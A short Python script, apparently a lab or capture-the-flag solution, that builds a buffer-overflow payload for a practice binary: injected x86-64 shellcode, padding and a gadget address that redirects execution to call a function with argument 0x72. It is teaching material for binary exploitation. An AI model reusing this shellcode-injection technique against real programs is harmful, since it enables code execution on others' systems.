#!/usr/bin/env python3
"""
Problem3 Payload Generator

Generate ans3.txt for shellcode exploit in problem3.
Injects shellcode that calls func1(0x72) to display lucky number message.

Shellcode (16 bytes):
- mov rdi, 0x72      ; set argument to 0x72
- mov rax, 0x401216  ; load func1 address
- jmp rax            ; call func1

Payload structure:
- shellcode (16 bytes)
- padding (24 bytes of 'A')
- jmp_xs gadget address (8 bytes) - redirects execution to shellcode
- final padding (16 bytes of 'B')
"""

from pathlib import Path

# Shellcode: mov rdi, 0x72; mov rax, func1_addr; jmp rax
shellcode = b'\x48\xc7\xc7\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xe0'

# jmp_xs gadget address (jumps to saved_rsp + 0x10, which points to our shellcode)
jmp_xs = (0x401334).to_bytes(8, 'little')

# Construct payload: shellcode + padding + gadget address + final padding
payload = shellcode + b'A' * (40 - len(shellcode)) + jmp_xs + b'B' * (64 - 40 - 8)

# Write to ans3.txt
Path(__file__).resolve().parents[1].joinpath("ans3.txt").write_bytes(payload)


